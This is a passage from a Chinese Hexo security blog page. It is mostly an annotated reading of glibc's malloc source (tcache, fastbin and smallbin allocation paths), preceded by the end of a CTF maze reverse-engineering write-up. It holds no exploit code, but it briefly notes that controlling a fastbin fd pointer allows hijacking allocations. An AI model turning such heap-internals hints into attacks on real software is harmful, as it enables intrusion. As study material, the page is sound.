2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">#  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  </span><br><span class="line">.  2  2  2  2  2  2  2  .  2  2  2  2  2  2  .  2  .  2  2  2  .  </span><br><span class="line">.  .  .  .  .  .  .  .  .  .  .  .  .  .  .  #  .  .  .  .  .  #</span><br></pre></td></tr></table></figure>

<p>发现,这就是地图啊,而且只有固定的唯一解,分析函数2后的srand函数和后面赋值函数的作用:</p>
<ul>
<li>随机将2处(也就是memset为-1的数字)随机设置成1(也就是图中的#)然后再遍历地图,将没有涉及到的-1转换成0.</li>
</ul>
<p>真相大白.</p>
<h2 id="国赛re300-GET"><a href="#国赛re300-GET" class="headerlink" title="国赛re300 !GET !"></a>国赛re300 !GET !</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/07/29/maze/" data-id="cjyn83qfn0036icth92maik6o" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-malloc源码精读总结" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/07/29/malloc源码精读总结/" class="article-date">
  <time datetime="2019-07-28T17:11:01.712Z" itemprop="datePublished">2019-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/PWN/">PWN</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/07/29/malloc源码精读总结/">malloc源码精读总结</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>之前草草读过一次源码以及华庭的源码分析,最近又有一些生疏了,决定用几周的时间精读一下</p>
<h1 id="一些个人对特性的总结理解"><a href="#一些个人对特性的总结理解" class="headerlink" title="一些个人对特性的总结理解"></a>一些个人对特性的总结理解</h1><h2 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="__libc_malloc"></a>__libc_malloc</h2><ul>
<li>malloc执行的开始</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes) </span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *) </span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<ul>
<li>size_t由系统决定一般情况下64位对应的是long unsigned int,32位为unsigned int,所以传入负数的时候会malloc一块非常大的堆块,这个时候就会触发一些特性</li>
<li>arena_ptr,指向一个arena</li>
<li>给名为hook的函数指针尝试读入<strong>malloc_hook,</strong>malloc_hook是一个调试变量,可以用来打印一些相关参数的值</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="keyword">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (tbytes);</span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="comment">//大小符合</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache <span class="comment">//非空</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>) <span class="comment">//对应位置非空</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx); <span class="comment">//从tcache中返回chunk指针</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<ul>
<li>这里是tcache部分</li>
<li>checked_request2size宏将传入的n转换成符合内存对齐的值,然后计算idx</li>
<li>判断大小符合,tcache非空,对应位置非空</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SINGLE_THREAD_P)<span class="comment">//单线程</span></span><br><span class="line">  &#123;</span><br><span class="line">    victim = _int_malloc (&amp;main_arena, bytes); <span class="comment">//执行_int_malloc</span></span><br><span class="line">    assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">     &amp;main_arena == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">        <span class="comment">//assert判断返回值,以及返回的chunk的arena是不是mainarena来的,以及chunk是不是mmap得到的,同时满足返回指针,指针非mmap返回,反查的arena是mainarena</span></span><br><span class="line">        <span class="keyword">return</span> victim;<span class="comment">//返回chunkptr</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>assert判断返回值,以及返回的chunk的arena是不是mainarena来的,以及chunk是不是mmap得到的,同时满足返回指针,指针非mmap返回,反查的arena是mainarena</li>
<li>随后返回chunkptr</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//下面是线程相关 arena.c定义了arena_get宏,执行会使at_ptr = thread_ptr,然后一些互斥锁balabala</span></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"><span class="comment">//同样在ar_ptr返回bytes,判断几个条件</span></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>多线程相关堆分配部分,除了一些互斥锁的加入,大体上还是一样的</li>
</ul>
<h2 id="int-malloc"><a href="#int-malloc" class="headerlink" title="_int_malloc"></a>_int_malloc</h2><ul>
<li>malloc关键的内存管理机制,<code>__libc_malloc</code>总是返回这里,前方高能代码量</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="keyword">size_t</span> bytes) <span class="comment">//两个参数分别是arena的地址,</span></span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>一些变量的定义,注意传入的两个参数分别为mainarena的地址以及当时传入malloc函数的值,下面称之为av以及bytes</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> checked_request2size (bytes, nb);<span class="comment">//将传入的值转换成符合条件的nb</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">    mmap.  */</span></span><br><span class="line"> <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>)) <span class="comment">//当传入的arena指针为空的时候执行sysmalloc</span></span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">     <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">alloc_perturb (p, bytes);</span><br><span class="line">     <span class="keyword">return</span> p;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">    This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">    can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<ul>
<li>依旧是将传入值变成对齐内存合法的size值,然后判断main_arena是否存在,因为后面的分配是基于此的</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line">  <span class="keyword">do</span>							\</span><br><span class="line">    &#123;							\</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)				\</span><br><span class="line">	<span class="keyword">break</span>;						\</span><br><span class="line">    &#125;							\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line">	 != victim);					\</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))<span class="comment">//开始了fastbin部分了,如果在fastbin范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb); <span class="comment">//按照fastbin的size—index关系计算index</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx); <span class="comment">//取对应fastbin位置的地址,即mainarena中一个固定偏移的地址,实际上就是对应位的链表头指针</span></span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb; <span class="comment">//victim尝试获取链表头指向的地址</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>) <span class="comment">//如果存在对应的值,则进入从fastbin中获取堆块的运算,否则进入smallbin的判断</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P) <span class="comment">//如果是单线程,那么直接进行单链表删除节点的操作,链表头写入该节点指向的下一个地址</span></span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>)) <span class="comment">//判断victim是否为空.</span></span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));<span class="comment">//判断该处指向的size是否符合之前的idx</span></span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">"malloc(): memory corruption (fast)"</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.  */</span></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>终于到了熟悉的fastbin阶段了,前面以及后文出现的nb皆为对齐后的size.</li>
<li>按照fastbin的size—index关系计算index</li>
<li>取对应fastbin位置的地址,即mainarena中一个固定偏移的地址,实际上就是对应位的链表头指针</li>
<li>victim尝试获取链表头指向的地址</li>
<li>如果存在对应的值,则进入从fastbin中获取堆块的运算,否则进入smallbin的判断</li>
<li>如果是单线程,那么直接进行单链表删除节点的操作,链表头写入该节点指向的下一个地址<code>(控制这个fd,可日).(两种不同size的fastbin 进行的覆写topchunk指针的操作,关键在与劫持fd,然后在mainarena中写入对应的值.)</code></li>
<li>再次判断分配出来的chunk是否满足idx依旧为当初的idx.</li>
<li>先看endif部分,这是没有tcache情况下的运算,将victim的chunk_ptr转换成user_ptr,然后return.</li>
<li>tcache部分,判断该size还有无剩余chunk,如果有的话,且tcache不是满的情况下,将此类的fastbin_chunk全部归入tcache中</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these "smallbins"</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb)) <span class="comment">// 判断是否在smallbin范围</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line">    <span class="comment">//根据nb寻找对应index的smallbin的头指针</span></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//寻找对应smallbin的双向链表的最后一个,如果不等于bin则存在</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr (<span class="string">"malloc(): smallbin double linked list corrupted"</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line">            <span class="comment">//删除节点,设置inuse位</span></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">    <span class="comment">//tcache部分将此处的所有smallbin归入tcache</span></span><br><span class="line">	  <span class="comment">/* While we're here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//返回heap_ptr</span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来是smallbins,同样判断是否在smallbin的范围,如果在的话,根据下标寻找双向链表头指针,便利如果存在则返回</li>
<li>将其余同样大小的smallbin归入tcache,然后返回chunk指针</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>前面的都不符合的时候,到了这里,如果存在fastbin的话,合并所有的相邻fastbin,归入unsorted bin中</li>
<li>//达成成就,飞机上写blog</li>
<li>注意malloc_consolidate触发是在第一次初始化fastbin的时候和申请largebin的时候</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span 